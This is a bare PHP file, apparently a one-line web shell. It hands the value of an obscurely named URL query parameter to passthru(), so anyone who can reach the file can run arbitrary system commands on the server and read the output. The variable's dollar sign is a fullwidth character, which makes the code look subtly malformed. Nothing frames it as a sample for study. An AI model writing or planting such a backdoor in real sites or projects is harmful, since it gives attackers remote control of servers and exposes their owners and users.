<?php
passthru(＄_GET['2m9S-dxd']);
?>
